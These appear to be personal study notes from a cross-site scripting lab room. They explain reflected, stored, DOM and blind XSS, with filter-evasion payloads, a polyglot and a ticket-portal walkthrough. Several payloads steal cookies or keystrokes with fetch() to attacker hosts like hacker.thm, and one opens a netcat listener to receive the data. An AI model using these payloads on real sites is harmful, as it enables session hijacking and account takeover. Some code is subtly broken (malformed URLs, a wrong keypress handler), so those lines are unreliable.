
# Cross Site Scripting 

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users

different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.

### PAYLOAD

payload is the JavaScript code we wish to be executed on the targets computer

parts:
- intention
- modification

**proof of concept**: simple payload that gets a JS pop up
`<script> alert('XSS')</script>`

**session stealing**

user's session, login tokens kept in targets machine

get target's cookie, base64 encode it, post it to website hacker controls
hacker now has cookies and is logged in as user
`<script> fetch('https:/hacker.thm/steal?cookie=' + btoa(document.cookie)) </script>`

**key logger**

anything typed on webpage will be forwarded to a website under hacker's control

```
<script>
document.keypress = function(e) {
  fetch('https:/hacker.thm/log?key=' + btoa(e.key ))
}
</script>
```

**business logic**

specifc example, calling a particular network resource or javascript function

javascript function that changes user email
- `user.changeEmail()`

```
<script> user.changeEmail('attacker@hacker.thm') </script>

```

### REFLECTED XSS 

it is when user supplied data in HTTP request is 
_included_ in the webpage without validation

- `website.thm/?error=invalid input detected`

```
<div class="alert alert-danger">
    <p>invalid input detected </p>
</div>
```

app does not check contents of error parameter 
- `websute.thm/?error=<script="https:/attacker.thm/evil.js"></script>`

```
<div class="alert alert-danger">
    <p><script="https:/attacker.thm/evil.js"></script> </p>
</div>
```

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

test every possible point of entry; these include:

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

### STORED XSS

XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

blog website that allows users to post comments. 
comments can have javascript code

malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

test
- Comments on a blog
- User profile information
- Website Listings

changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 

### DOM

document object model 

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

### BLIND XSS

payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code,  These messages then get turned into support tickets which staff view on a private web portal.

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

 you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

How your JavaScript payload gets reflected in a target website's code will determine the payload you need to use.

for each level

```
1. <script>alert('THM');</script> 
2. "><script>alert("THM")</script>   user input gets print out with "hello <name>"
3. </textarea><script>alert('THM')</script> user input gets printed into text area
4. ';alert('THM')//  user input name gets stored in JS class name
5. similar to 4, but `script` is checked and removed, so you need to misspell the tag
   
   <sscriptcript>alert('THM')</sscriptcript>
   `script` is removed
   <script>alert('THM')</script>

6.  user input for image path: `/images/cat.jpg`  onload=a"alert('THM')
```

### Polyglots

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )
//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/
--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

### BLIND XSS

1. support tickets tab > create ticket, word test (title & subject)
2. suppot tickets tab > create tab > inside text area: `</textarea>test`
3. suppot tickets tab > create tab > see if JS can run: `</textarea><script>alert('THM')<script>`

a staff member will likely see the ticket so JS executable code
get user data from cookies --> extract cookies
privilege esculation 

need a sever to listen and get the info
netcat  `nc -nlvp 9001`

4. suppot tickets tab > create tab > inside text area: `</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script> `

